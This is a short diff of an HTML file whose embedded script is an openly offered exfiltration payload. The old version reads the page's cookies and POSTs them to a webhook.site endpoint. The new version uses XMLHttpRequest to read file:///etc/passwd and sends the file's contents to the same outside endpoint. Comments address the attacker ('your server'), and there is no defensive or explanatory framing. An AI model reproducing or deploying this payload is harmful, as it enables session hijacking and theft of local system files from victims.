@@ -1,15 +1,23 @@
 <html>
-<head></head>
+<head>
+</head>
 <body>
     <script>
-        // Capture the document cookie
-        var userCookie = document.cookie;
+        // Create a new XMLHttpRequest
+        var x = new XMLHttpRequest();
 
-        // Send the cookie to your webhook endpoint
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://webhook.site/036cf903-e785-4967-8ac6-83104bba907b', true);
-        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-        xhr.send('cookie=' + encodeURIComponent(userCookie));
+        // Function to send data to your server when the response is loaded
+        x.onload = function() {
+            // Send the content of the file to your server
+            var sendXhr = new XMLHttpRequest();
+            sendXhr.open('POST', 'https://webhook.site/036cf903-e785-4967-8ac6-83104bba907b', true);
+            sendXhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            sendXhr.send('data=' + encodeURIComponent(this.responseText));
+        };
+
+        // Open the request to read the file
+        x.open("GET", "file:///etc/passwd", true);
+        x.send();
     </script>
 </body>
 </html>
